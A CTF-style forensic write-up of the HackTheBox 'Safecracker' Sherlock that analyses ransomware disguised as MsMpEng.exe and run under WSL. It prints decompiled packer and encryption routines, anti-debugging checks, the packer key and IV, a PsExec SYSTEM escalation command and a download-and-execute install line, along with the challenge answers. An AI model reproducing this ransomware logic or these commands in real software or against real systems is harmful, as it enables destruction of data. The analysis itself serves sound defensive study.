---
title: Safecracker [HackTheBox sherlocks]
time: 2025-08-05 12:00:00
categories: [CTF]
tags: [malware,ctf,wargame]
image: /assets/posts/HackTheBoxSafecracker/1.png
---
## Description
We recently hired some contractors to continue the development of our Backup services hosted on a Windows server. We have provided the contractors with accounts for our domain. When our system administrator recently logged on, we found some pretty critical files encrypted and a note left by the attackers. We suspect we have been ransomwared. We want to understand how this attack happened via a full in-depth analysis of any malicious files out of our standard triage. A word of warning, our tooling didn't pick up any of the actions carried out - this could be advanced. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.
## Solution 
### Initial analysis
##### After reviewing all artifacts, I found a file named ConsoleHost_history.txt (PowerShell history). It contains some commands executed by the users contractor01 and Administrator.
##### For the user contractor01: 

```
ubuntu
whoami
net user
net group
net groups
cd ../../
cd .\Users\contractor01\Contacts\
ls
cd .\PSTools\
ls
.\PsExec64.exe -s -i cmd.exe
```
![image](/assets/posts/HackTheBoxSafecracker/image.png)
##### The command `PsExec64.exe -s -i cmd.exe` launches a Command Prompt with SYSTEM privileges, which are higher than Administrator. This is a strong indicator of malicious activity.
#### Q1. Which user account was utilised for initial access to our company server? -> `contractor01`
#### Q2. Which command did the TA utilise to escalate to SYSTEM after the initial compromise? -> `.\PsExec64.exe -s -i cmd.exe`
##### Continuing with the PowerShell history of the `Administrator` user:

```
wsl --install
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install firefox -y
choco install filezilla -y
choco install filezilla.server
netstat -nao
gpupdate /force
wsl --list -v
wsl --set-version Ubuntu-20.04 2
wsl --install
wsl --set-version Ubuntu-20.04 2
wsl --set-version Ubuntu 2
wsl -l -v
wsl --set-version Ubuntu-22.04 2
wsl -l 0v
wsl -l -v
wsl --set-default-version 2
wsl --list-online
wsl --list --online
wsl --install
wsl --set-default-version 2
wsl --set-version Ubuntu-22.04 2
wsl --set-version Ubuntu-20.04 2
wsl --list --online
wsl --set-version Ubuntu-20.04
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
wsl --set-version Ubuntu-20.04
wsl -l -v
wslconfig.exe /u Ubuntu
wsl -l -v
wsl --install
wslconfig /l
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
wsl --install
wsl
wsl --install
wsl --install -d Ubuntu-20.04
wslconfig /l
wsl -l -v
wsl --install -d Ubuntu-20.04 2
wsl -l -o
wslconfig.exe /u Ubuntu
wsl -l -v
wslconfig.exe /u Ubuntu-20.04
wsl -l -v
wsl --install -d Ubuntu 2
wsl --install -d Ubuntu 
wsl -l -v
wslconfig.exe /u Ubuntu
wsl --set-default-version 2
ping 1.1.1.1
ipconfig
wsl --install#
wsl --install
wsl --install -d Ubuntu
wsreset.exe
net stop wuauserv
net start wuauserv
wsl --install -d Ubuntu
wsl --install -d Debian
reboot now
wsl --install
wsl --install -d Ubuntu
wsl --install -d Ubuntu-20.04
wsl
winget uninstall
wsl --list
wsl --install
wsl --install -d Ubuntu-22.04
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
wsl --install -d Ubuntu-22.04
wsl
wsl --install -d Ubuntu-22.04
wsl
wsl -l -v
```
##### The `Administrator` user appears to have installed and configured WSL.
##### The `backups` folder contains several `.note` files (ransom notes) and `.31337` files. The `.31337` files could not be identified by file type, suggesting they may be encrypted.

```
┌──(kali㉿kali)-[~/…/C%3A/Users/Administrator/Backups]
└─$ ll
total 76156
-rwxrwxrwx 1 kali kali      703 Jun  7  2023 iisstart.htm
-rwxrwxrwx 1 kali kali     5205 Jun  7  2023 passbolt-recovery-kit.txt
-rwxrwxrwx 1 kali kali   273460 Jun  7  2023 sales-leads.json
-rwxrwxrwx 1 kali kali 53017920 Jun 21  2023 sales-pitch.mp4.31337
-rwxrwxrwx 1 kali kali      336 Jun 21  2023 sales-pitch.mp4.note
-rwxrwxrwx 1 kali kali   152242 Jun 21  2023 splunk-add-on-for-microsoft-windows_870.tgz
-rwxrwxrwx 1 kali kali 24510912 Jun 21  2023 updates.zip.31337
-rwxrwxrwx 1 kali kali      336 Jun 21  2023 updates.zip.note
```
#### Q.17 What file extension does the ransomware rename files to? -> `.31337`
##### Contents of the ransom note file:
![image](/assets/posts/HackTheBoxSafecracker/2.png)
#### Q18. What is the bitcoin address in the ransomware note? -> `16ftSEQ4ctQFDtVZiUBusQUjRrGhM3JYwe`
##### In the `Downloads` folder, there is a file with a `.exe` extension. However, upon inspection, it is actually an ELF file. This is very suspicious and suggests that it may be intended to run within WSL. 
##### The attacker likely used the `.exe` extension to mislead Windows users, as `.exe` is a commonly trusted file format on Windows systems.

```
┌──(kali㉿kali)-[~/…/C%3A/Users/Administrator/Downloads]
└─$ ll
total 9192
-rwxrwxrwx 1 kali kali 4301472 Jun 12  2023 MsMpEng.exe
-rwxrwxrwx 1 kali kali 5097152 Jun 21  2023 Sysmon.zip.31337
-rwxrwxrwx 1 kali kali     336 Jun 21  2023 Sysmon.zip.note
-rwxrwxrwx 1 kali kali      84 Jun 21  2023 desktop.ini
```
##### To assess the impact on the system, I used MFTECmd and Timeline Explorer to analyze file activity and identify the point of compromise.

##### After filtering for `.31337` extension files (suspected encrypted files), I identified 33 in total. The earliest encryption activity occurred at `2023-06-21 13:06:14`, marking the likely start of the ransomware execution.
![image](/assets/posts/HackTheBoxSafecracker/3.png)
#### Q3. How many files have been encrypted by the the ransomware deployment? -> `33`
### Malware detect
##### Tracing back from `13:06:14`, I observed that the file `MsMpEng.exe` was created just before the encryption activity started.

![image](/assets/posts/HackTheBoxSafecracker/4.png)
##### This provides evidence that the ELF file played a role in the file encryption.

##### Check infomation with die tool
![image](/assets/posts/HackTheBoxSafecracker/5.png)
#### Q14. What compiler was used to create the malware? -> `gcc`

```
┌──(kali㉿kali)-[~/…/C%3A/Users/Administrator/Downloads]
└─$ readelf -p .comment MsMpEng.exe 

String dump of section '.comment':
  [     0]  GCC: (Debian 10.2.1-6) 10.2.1 20210110
```
#### Q16. What is the contents of the .comment section? -> `GCC: (Debian 10.2.1-6) 10.2.1 20210110`

### Reverse malware - Stage 1 
##### I loaded the ELF file into IDA and began analysis from the `main` function.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // rax
  char s[8]; // [rsp+10h] [rbp-130h] BYREF
 __int64 v6; // [rsp+18h] [rbp-128h]
  __int64 v7; // [rsp+20h] [rbp-120h]
  __int64 v8; // [rsp+28h] [rbp-118h]
  __int64 v9; // [rsp+30h] [rbp-110h]
  __int64 v10; // [rsp+38h] [rbp-108h]
  __int64 v11; // [rsp+40h] [rbp-100h]
  __int64 v12; // [rsp+48h] [rbp-F8h]
  __int64 v13; // [rsp+50h] [rbp-F0h]
  __int64 v14; // [rsp+58h] [rbp-E8h]
  ...
  __int64 v30; // [rsp+D8h] [rbp-68h]
  __int64 v31; // [rsp+E0h] [rbp-60h]
  __int64 v32; // [rsp+E8h] [rbp-58h]
  __int64 v33; // [rsp+F0h] [rbp-50h]
  __int64 v34; // [rsp+F8h] [rbp-48h]
  __int64 v35; // [rsp+100h] [rbp-40h]
  __int64 v36; // [rsp+108h] [rbp-38h]
  int fd; // [rsp+118h] [rbp-28h]
  int errnum; // [rsp+11Ch] [rbp-24h]
  void *buf; // [rsp+120h] [rbp-20h]
  void *ptr; // [rsp+128h] [rbp-18h]
  __int64 v41; // [rsp+130h] [rbp-10h]
  size_t size; // [rsp+138h] [rbp-8h]

  size = (size_t)&unk_36D920;
  v41 = 1637173LL;
  ptr = malloc((unsigned int)::size);
  buf = malloc((size_t)&unk_36D920);
  sub_3A29B(&unk_2893A0, ptr, (unsigned int)::size);
  errnum = sub_3A3CB(ptr, buf, size, size);
  if ( errnum < 0 )
    sub_3A4AC((unsigned int)errnum);
  free(ptr);
  fd = memfd_create("test", 1LL);
  if ( fd <= 0 )
  {
    printf("ERROR FD:%i\n", fd);
    exit(-1);
  }
  errnum = write(fd, buf, errnum);
  if ( errnum <= 0 )
  {
    v3 = strerror(errnum);
    fprintf(stderr, "Error Writing: %s\n", v3);
    exit(-1);
  }
  free(buf);
  *(_QWORD *)s = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  ...
  v31 = 0LL;
  v32 = 0LL;
  v33 = 0LL;
  v34 = 0LL;
  v35 = 0LL;
  v36 = 0LL;
  sprintf(s, "/proc/self/fd/%i", fd);
  execl(s, "PROGRAM", 0LL);
  return 0LL;
}
```
##### Allocates memory regions `ptr` and `buf` with a size of `0x18FB40` (from `&unk_36D920`).

![image](/assets/posts/HackTheBoxSafecracker/6.png)

##### Calls `sub_3A29B` to copy or write raw data from `unk_2893A0` into `ptr`.
##### Calls `sub_3A3CB` to decrypt data from `ptr` into `buf`. The decrypted data likely represents a binary payload.

##### Creates an anonymous in-memory file descriptor using `memfd_create("test", 1)`.

##### Writes the decrypted data (`buf`) to the memory file descriptor.

##### Constructs a path to the in-memory file using `/proc/self/fd/<fd>` and executes it via `execl`, effectively running the decrypted payload directly from memory.

#### Q8. What was the name of the memoryfd the packer used? -> `test`
##### Finally, it calls `execl("/proc/self/fd/{fd}", "PROGRAM", NULL)` to execute the memory region as an ELF binary.

##### This runs the ELF file directly from memory under the process name `PROGRAM`, without writing it to disk — a technique commonly used to hide malware.

#### Q4. What is the name of the process that the unpacked executable runs as? -> `PROGRAM`
##### Now, let's analyze in more detail. We'll focus on the `sub_3A29B` function, as it is responsible for decrypting the packed data using AES-256-CBC.

```c
__int64 __fastcall sub_3A29B(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v4; // rsi
  unsigned int v7; // [rsp+20h] [rbp-20h] BYREF
  unsigned int v8; // [rsp+24h] [rbp-1Ch]
  __int64 *v9; // [rsp+28h] [rbp-18h]
  void *v10; // [rsp+30h] [rbp-10h]
  void *v11; // [rsp+38h] [rbp-8h]

  v11 = malloc(32uLL);
  v10 = malloc(0x10uLL);
  sub_3A95D(off_418EE8[0], v11);
  sub_3A95D(off_418EF0, v10);
  v9 = (__int64 *)sub_3E9A0();
  if ( v9 && (v4 = sub_3E2E0(), (unsigned int)sub_3FC70(v9, v4, 0LL, v11, v10) == 1) )
  {
    if ( (unsigned int)sub_402D0(v9, a2, &v7, a1, a3) == 1
      && (v8 = v7, (unsigned int)sub_40AA0(v9, (__m128i *)((int)v7 + a2), (int *)&v7) == 1) )
    {
      v8 += v7;
      sub_3E9C0(v9);
      return v8;
    }
    else
    {
      sub_3A285();
      return 0LL;
    }
  }
  else
  {
    sub_3A285();
    return 0LL;
  }
}
```
##### After memory allocation, the function assigns the key and IV to `v11` and `v10`, respectively.
![image](/assets/posts/HackTheBoxSafecracker/7.png)
![image](/assets/posts/HackTheBoxSafecracker/8.png)
##### Key: a5f41376d435dc6c61ef9ddf2c4a9543c7d68ec746e690fe391bf1604362742f
##### IV: 95e61ead02c32dab646478048203fd0b
#### Q7. What was the encryption key and IV for the packer? -> `a5f41376d435dc6c61ef9ddf2c4a9543c7d68ec746e690fe391bf1604362742f:95e61ead02c32dab646478048203fd0b`
##### The `sub_3E9A0()` function initializes an `EVP_CIPHER_CTX` (OpenSSL's decryption context). Then, `sub_3FC70()` sets the decryption parameters:

```c
v8 = sub_3E9A0(); // Create EVP_CIPHER_CTX  
sub_3FC70(v8, v4, 0LL, v10, v9); // EVP_DecryptInit_ex(ctx, key, IV)  
```
##### By comparing with the AES Key Length Comparison Table, I identified that the encryption mode is AES-256-CBC.
![image](/assets/posts/HackTheBoxSafecracker/9.png)
#### Q6. What encryption was the packer using? -> `AES-256-CBC`
##### Upon deeper analysis, I found the following path:

![image](/assets/posts/HackTheBoxSafecracker/10.png)

##### This path contains an SSL certificate and reveals that `blitztide` is likely the username (or handle) of the developer or original owner of the malware source code.

#### Q20. It appears that the attacker has bought the malware strain from another hacker, what is their handle? -> `blitztide`

##### After AES decryption, the program continues by decompressing the data using the Zlib/Gzip inflate algorithm via `sub_1D45B0`.  
If an error occurs, it calls an error-handling function — likely from the Zlib library.

![image](/assets/posts/HackTheBoxSafecracker/11.png)

#### Q10. What compression library was used to compress the packed binary? -> `zlib`
##### Write a simple script to extract the encrypted data.

##### I have the packed data starting at address `0x2893A0` (physical offset `0x2883A0`, so the file offset is `0x10000`), with a total length of `0x18FB40` bytes.

![image](/assets/posts/HackTheBoxSafecracker/112.png)

```python
from Crypto.Cipher import AES
from binascii import unhexlify
import zlib
data_offset = 0x2883a0
data_size = 0x18fb40
with open('MsMpEng.exe', 'rb') as f:
    encrypted = f.read()[data_offset:data_offset+data_size]
with open('encrypted_elf', 'wb') as f:
    f.write(encrypted)
```
##### I extracted the packed data using file offset `0x10000` and length `0x18FB40`.  
##### To decrypt it, I used [CyberChef](https://gchq.github.io/CyberChef) with the following steps:

1. Load the binary data (`packed_data.bin`) into CyberChef.
2. Use the `AES Decrypt` operation:
   - Mode: `CBC`
   - Key: *(32-byte hex key)*
   - IV: *(16-byte hex IV)*
   - Input type: `Raw`
   - Output type: `Raw`
3. After decryption, use the `Zlib Inflate` operation to decompress the data.
 
![image](/assets/posts/HackTheBoxSafecracker/12.png)

### Reverse malware - Stage 2
##### Loaded the new ELF file into IDA — this is the `main` function:

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // [rsp+0h] [rbp-38h] BYREF

  if ( (unsigned int)sub_4ADD8(a1, a2, a3, a4, a5, a6, &unk_36DFC0, 0LL, "daV324982S3bh2", 14LL, 0LL, 0LL)
    || (unsigned int)sub_4AA3D()
    || (raise(11), (unsigned int)sub_4A3B5())
    || (unsigned int)sub_4A3F6(&v7)
    || (raise(11), puts("Running update, testing update endpoints"), (unsigned int)sub_4AB00(&v7))
    || (unsigned int)sub_4AC39("/mnt/c/Users", &v7)
    || (raise(11), sub_4A8F6(&v7), (unsigned int)sub_4A5C1(&v7)) )
  {
    sub_28164A();
  }
  raise(11);
  puts("-----------------------------------------");
  puts("Configuration Successful\nYou can now connect to the Corporate VPN");
  return 0LL;
}
```
##### Overall, this could be malware masquerading as a VPN configuration.

```c 
__int64 sub_4ADD8()
{
  __sigset_t *p_sa_mask; // rdi
  __int64 i; // rcx
  struct sigaction act; // [rsp+8h] [rbp-A0h] BYREF

  if ( (unsigned int)sub_4AD2C() )
  {
    puts("*******DEBUGGED********");
  }
  else
  {
    p_sa_mask = &act.sa_mask;
    for ( i = 36LL; i; --i )
    {
      LODWORD(p_sa_mask->__val[0]) = 0;
      p_sa_mask = (__sigset_t *)((char *)p_sa_mask + 4);
    }
    act.sa_flags = 4;
    act.sa_handler = (__sighandler_t)sub_4ACFE;
    if ( sigaction(11, &act, 0LL) == -1 )
      _exit(1);
  }
  return 0LL;
}
```
##### ##### In the `sub_4ADD8` function, it calls `sub_4AD2C` to check if the program is being debugged. If debugging is detected, it prints `*******DEBUGGED********`.
#### Q15. If the malware detects a debugger, what string is printed to the screen? -> `*******DEBUGGED********`
##### If debugging is not detected, the program sets a custom handler for the `SIGSEGV` signal (signal 11), which indicates a segmentation fault.
#### Q12. What exception does the binary raise? -> `SIGSEGV`
##### This is content of sub_4AD2C funct

```c
int sub_4AD2C()
{
  FILE *v0; // rax
  FILE *v1; // rbx
  char *v2; // rdi
  char *v4; // rdi
  char *v5; // [rsp+0h] [rbp-408h] BYREF
  char s[1024]; // [rsp+8h] [rbp-400h] BYREF

  v5 = 0LL;
  v0 = fopen("/proc/self/status", "r");
  if ( v0 )
  {
    v1 = v0;
    while ( fgets(s, 990, v1) )
    {
      v2 = strstr(s, "TracerPid");
      if ( v2 )
      {
        if ( strtok_r(v2, ":", &v5) )
        {
          v4 = strtok_r(0LL, ":", &v5);
          if ( v4 )
            return atoi(v4);
        }
        return -1;
      }
    }
  }
  else
  {
    fclose(0LL);
  }
  return -1;
}
```
##### This function checks the value of `TracerPid` in `/proc/self/status` to determine whether the program is being debugged.

```
TracerPid is a field in /proc/self/status on Linux systems that indicates the process ID (PID) of any debugger currently tracing the process; if the value is 0, it means the process is not being debugged, making it useful for anti-debugging checks in malware or protected applications.
```
#### Q19. What string does the binary look for when looking for a debugger? -> `TracerPid`
#### Q11. The binary appears to check for a debugger, what file does it check to achieve this? -> `/proc/self/status`

##### After the debug check, `main()` continues by calling `sub_4AC39("/mnt/c/Users", &v7)` to encrypt files in this folder.
#### Q9. What was the target directory for the ransomware? -> `/mnt/c/Users`

```c
__int64 __fastcall sub_4AC39(const char *a1, __int64 a2)
{
  DIR *v2; // rbp
  struct dirent *v3; // rbx
  unsigned __int8 d_type; // al
  char v6[4152]; // [rsp+0h] [rbp-1038h] BYREF

  v2 = opendir(a1);
  if ( !v2 )
    return 1LL;
  while ( 1 )
  {
    v3 = readdir(v2);
    if ( !v3 )
      break;
    raise(11);
    snprintf(v6, 0x1000uLL, "%s/%s", a1, v3->d_name);
    d_type = v3->d_type;
    if ( d_type == 4 )
    {
      if ( !(unsigned int)sub_4ABF9(v3->d_name) )
        sub_4AC39(v6, a2);
    }
    else if ( d_type == 8 )
    {
      if ( (unsigned int)sub_4AB61(v6) )
        sub_4A955(a2, v6);
    }
  }
  closedir(v2);
  return 0LL;
}
```
##### `sub_4AC39` is a recursive function that lists all files using `readdir()`.  
##### To confirm that it uses the `readdir()` system call, I checked the references in `libc.so.6` using IDA.

```bash 
┌──(kali㉿kali)-[~/…/C%3A/Users/Administrator/Downloads]
└─$ ldd download.elf 
	linux-vdso.so.1 (0x00007f2787232000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f278720e000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f2787209000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2786c0a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f2787234000)
```                                                 
![image](/assets/posts/HackTheBoxSafecracker/13.png)
#### Q21. What system call is utilised by the binary to list the files within the targeted directories? -> `getdents64`


```c
__int64 __fastcall sub_4AB61(char *haystack)
{
  const char *v1; // r15
  int v2; // ebx
  int v3; // r13d
  size_t v4; // rax
  unsigned __int64 v5; // rcx

  v1 = aJ;
  v2 = 0;
  v3 = dword_368484;
  while ( 1 )
  {
    if ( v3 <= v2 )
      return 0LL;
    v4 = strlen(v1);
    v5 = 0LL;
    while ( v4 != v5 )
    {
      needle[v5] = v1[v5] ^ aDav324982s3bh2[v5 % 0xE];
      if ( v4 < ++v5 )
        goto LABEL_7;
    }
    needle[v4] = 0;
LABEL_7:
    v1 += 8;
    if ( strstr(haystack, needle) )
      return 1LL;
    ++v2;
  }
}
```
##### It decrypts all files with extensions listed in array `aJ`, and encrypts them using XOR with the key `daV324982S3bh2`.
![image](/assets/posts/HackTheBoxSafecracker/14.png)
![image](/assets/posts/HackTheBoxSafecracker/15.png)
#### Q5. What is the XOR key used for the encrypted strings? -> `daV324982S3bh2`
![image](/assets/posts/HackTheBoxSafecracker/16.png)
#### Q13. Out of this list, what extension is not targeted by the malware? .pptx,.pdf,.tar.gz,.tar,.zip,.exe,.mp4,.mp3 -> `.exe`
##### Finally, it encrypts all target files, drops a ransom note, and deletes the original unencrypted files with remove().

```c
__int64 __fastcall sub_4A5C1(__int64 a1)
{
  const char **v1; // rbx
  FILE *v2; // rbp
  FILE *v3; // r12
  size_t v4; // rax
  int v5; // eax
  FILE *v6; // r15
  size_t v7; // rsi
  void *v8; // r14
  __int64 v9; // rax
  int v10; // eax
  unsigned int ptr; // [rsp+10h] [rbp-468h]
  size_t v13; // [rsp+18h] [rbp-460h]
  __int64 v14; // [rsp+18h] [rbp-460h]
  char v15[256]; // [rsp+20h] [rbp-458h] BYREF
  char filename[256]; // [rsp+120h] [rbp-358h] BYREF
  _BYTE v17[256]; // [rsp+220h] [rbp-258h] BYREF
  _BYTE v18[344]; // [rsp+320h] [rbp-158h] BYREF

  v1 = *(const char ***)(a1 + 32);
  while ( v1 )
  {
    v2 = fopen(*v1, "rb");
    if ( v2 )
    {
      snprintf(v15, 0x100uLL, "%s.31337", *v1);
      snprintf(filename, 0x100uLL, "%s.note", *v1);
      v3 = fopen(v15, "wb");
      if ( v3 )
      {
        while ( 1 )
        {
          v4 = fread(v17, 1uLL, 0x100uLL, v2);
          if ( (int)v4 <= 0 )
            break;
          v13 = v4;
          raise(11);
          v5 = sub_4A47D(v17, v13, *(_QWORD *)(a1 + 40), *(_QWORD *)(a1 + 40) + 33LL);
          if ( v5 < 0 )
          {
            fclose(v2);
            fclose(v3);
            break;
          }
          fwrite(v18, 1uLL, v5, v3);
        }
        v6 = fopen(filename, "wb");
        if ( v6 )
        {
          v7 = (int)sub_4AE53();
          v8 = calloc(1uLL, v7);
          v14 = *(_QWORD *)(a1 + 40);
          ptr = sub_4AE53();
          v9 = sub_4AE4B();
          v10 = sub_4A523(v9, ptr, v14, v14 + 33, v8);
          fwrite(v8, 1uLL, v10, v6);
          fclose(v6);
          free(v8);
          fclose(v2);
          fclose(v3);
          if ( remove(*v1) )
            fputs("Failed to delete original file", stderr);
          v1 = (const char **)v1[1];
        }
      }
      else
      {
        fclose(v2);
      }
    }
  }
  return 0LL;
}
```
![image](/assets/posts/HackTheBoxSafecracker/17.png)
#### Q22. Which system call is used to delete the original files? -> `unlink`
